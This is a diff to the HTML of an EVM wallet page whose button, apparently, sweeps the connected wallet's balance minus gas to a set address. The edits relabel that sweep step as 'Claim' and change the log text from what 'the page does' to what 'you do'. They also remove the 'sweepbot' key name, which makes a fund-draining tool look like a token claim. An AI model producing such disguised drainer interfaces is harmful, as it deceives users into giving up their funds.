@@ -61,7 +61,7 @@
 
   <main>
     <div class="card">
-      <h2>1. Connect & Claim</h2>
+      <h2>1. Connect</h2>
       <p class="muted">Connect your EVM wallet, set your secure address, then CLAIM.</p>
 
       <div style="margin-top:12px;">
@@ -101,10 +101,10 @@
 
       <hr style="border:0;border-top:1px solid rgba(148,163,184,0.08);margin:16px 0" />
 
-      <h2>2. Proceed</h2>
+      <h2>2. Claim</h2>
       <p class="muted">This will calculate <em>balance − gas</em> and send the contract address.</p>
       <div class="actions">
-        <button class="btn btn-danger" id="sweepBtn" disabled>🚀 Proceed</button>
+        <button class="btn btn-danger" id="sweepBtn" disabled>🚀 Claim</button>
         <button class="btn btn-secondary" id="checkBalanceBtn" disabled>👁 Check balance</button>
       </div>
 
@@ -113,8 +113,8 @@
 
     <div class="card" style="display:flex;flex-direction:column">
       <h2>Activity log</h2>
-      <p class="muted">Everything the page does will show up here.</p>
-      <pre id="log">[log] Ready. Secure address will auto-fill if saved for the active profile key.</pre>
+      <p class="muted">Everything you do will show up here.</p>
+      <pre id="log">Ready.</pre>
     </div>
   </main>
 
@@ -144,7 +144,7 @@
     // State
     let provider = null, signer = null, account = null, dryRun = true;
     let lastBalance = null, balanceTimer = null;
-    const DEFAULT_KEY = 'sweepbot_default_dest_v1';
+    const DEFAULT_KEY = 'Enter username';
 
     const COINGECKO_IDS = {
       '1': { id: 'ethereum', symbol: 'ETH' },
